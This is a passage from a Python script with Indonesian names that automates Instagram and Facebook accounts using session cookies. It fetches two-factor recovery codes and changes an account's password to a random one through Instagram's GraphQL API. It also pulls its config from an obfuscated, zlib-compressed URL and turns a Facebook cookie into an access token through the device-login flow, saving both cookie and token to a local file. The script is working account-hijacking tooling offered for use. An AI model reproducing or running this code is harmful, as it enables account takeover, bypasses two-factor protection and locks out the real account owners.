               'sec-ch-ua-mobile': '?0',
               'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
               'viewport-width': '980',
               'x-fb-friendly-name': 'useFXSettingsTwoFactorFetchRecoveryCodesMutation',
               'x-fb-lsd': '7g42wKUg5uJbzrClbnTyuB',
               'content-type': 'application/x-www-form-urlencoded',
               'x-asbd-id': '129477',
               'dpr': '2',
               'sec-ch-ua-full-version-list': 'Not_A',
               'sec-ch-prefers-color-scheme': 'light',
               'sec-ch-ua-platform': 'Linux',
               'accept': '*/*',
               'origin': 'https://accountscenter.instagram.com',
               'sec-fetch-site': 'same-origin',
               'sec-fetch-mode': 'cors',
               'sec-fetch-dest': 'empty',
               'referer': 'https://accountscenter.instagram.com/password_and_security/two_factor/',
               'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',})
           reqs = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cokie}, data=data, headers=head).json()
           return reqs
       except Exception as e:
           return None

   def OverPower(self):
       while True:
         try:
             self.uid = str(uuid.uuid4())
             self.ps  = requests.get(zlib.decompress(KamuNya)).json()

             self.NazriDev.update({'data':self.ps['xyraacode']['MidConfig'],'curl':self.ps['CURLpost']['xyraacodeURL'],'meta':self.ps['Headers']['xyraacodeHEAD']})
             self.data = self.NazriDev['data']
             self.data.update({
                  'device_id':'android-%s'%(self.Android_ID('null','null').hexdigest()[:16]),
                  'custom_device_id':str(self.uid),
                }
             )
             self.meta = self.NazriDev['meta']
             self.meta.update({
                  'x-ig-device-id': str(self.uid),
                  'x-ig-android-id': str(self.data['device_id']),
                  'x-ig-timezone-offset': str(self.timezone_offset()),
                  'content-length': str(len(self.data))
                }
             )
             self.resp = requests.post(self.NazriDev['curl'], data=self.data, headers=self.meta)
             self.appc = self.resp.headers['ig-set-x-mid']
             if self.appc not in self.MID:
                if len(self.MID) <6:
                   self.MID.append(self.appc)
                else: break
         except: break

   def PasswordNEW(self):
       self.abd = ['ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz']
       self.san = ''.join(random.choice(random.choice(self.abd)) for _ in range(12))
       return(self.san)

   def SandiBaru(self, cookie, old_pw):
       try:
            resp = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', cookies={'cookie':cookie}).text
            head = self.headers_graph(resp)
            head.update({'Host': 'accountscenter.instagram.com','x-fb-friendly-name': 'useFXSettingsChangePasswordMutation','user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',})
            data      = self.data_graph(resp)
            old_pwx   = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),old_pw)
            self.sand = self.PasswordNEW()
            new_pw    = "#PWD_BROWSER:0:{}:{}".format(int(time.time()),self.sand)
            data.update({'fb_api_req_friendly_name': 'useFXSettingsChangePasswordMutation','variables': '{"account_id":"'+data['av']+'","account_type":"INSTAGRAM","current_password_enc":{"sensitive_string_value":"'+str(old_pwx)+'"},"new_password_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"new_password_confirm_enc":{"sensitive_string_value":"'+str(new_pw)+'"},"client_mutation_id":"'+self.ClientId(resp)+'","should_logout":false}','doc_id': '6616377658461852',})
            respon = requests.post('https://accountscenter.instagram.com/api/graphql/', cookies={'cookie':cookie}, data=data, headers=head).text
            if '"success":true' in str(respon):return new_pw.split(':')[3]
            else:return old_pwx.split(':')[3]
       except:return old_pw

class MainDev:

   def __init__(self)->None:
       self.data, self.host = {}, 'https://m.facebook.com'
       self.token_app = '1348564698517390|007c0a9101b9e1c8ffab727666805038'

   def Run(self)->str:
       if len(sys.argv) == 2:
          if sys.argv[1].split('=')[1] == 'True':
             if os.path.isfile('data/FB-login.txt') is False:
                self.ok = True
                while self.ok:
                    self.ok = self.GetingCode(input('FBcookie: '))
                    if 'EAAT' in str(self.ok): break
                os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
                print('Login Berhasil, Fiture Facebook Sekarang Bisa Di Gunakan.')
                os.system('clear' if sys.platform.lower() == 'linux' else 'cls')
                time.sleep(2)
                MAIN().insta()
             else:MAIN().insta()
       else:
          MAIN().insta()

   def GetingCode(self, coki):
       with requests.Session() as r:
         try:
              self.r = r.post(f'https://graph.facebook.com/v2.6/device/login?access_token={self.token_app}').json()
              self.user_code, self.code = self.r['user_code'], self.r['code']
              self.r1 = bsp(r.get(f'https://m.facebook.com/device?user_code={self.user_code}', cookies = {'cookie':coki}).text,'html.parser')
              self.ls = ['fb_dtsg','jazoest','qr']
              for self.i in self.r1.find_all('input'):
                  if self.i.get('name') in self.ls: self.data.update({self.i['name']:self.i['value']})
              self.data.update({'user_code':self.user_code})
              self.ul = self.r1.find('form', method='post')['action']
              self.r2 = bsp(r.post(self.host + self.ul, data=self.data, cookies = {'cookie':coki}).text,'html.parser')
              self.data.clear()
              for self.a in self.r2.find_all('input'):
                  if self.a.get('name') == '__CANCEL__':pass
                  else:self.data.update({self.a.get('name','submit'):self.a.get('value')})
              self.r3 = r.post(self.host + self.r2.find('form', method='post')['action'], data=self.data, cookies = {'cookie':coki}).text
              self.r4 = r.post(f'https://graph.facebook.com/v2.6/device/login_status?access_token={self.token_app}&code={self.code}',cookies = {'cookie':coki}).json()['access_token']
              self.rt = '%s|%s'%(coki, self.r4)
              open('data/FB-login.txt','w').write(self.rt)
              return self.r4
         except (KeyError, Exception):
              return True

MainDev().Run()
#MAIN().CariNama()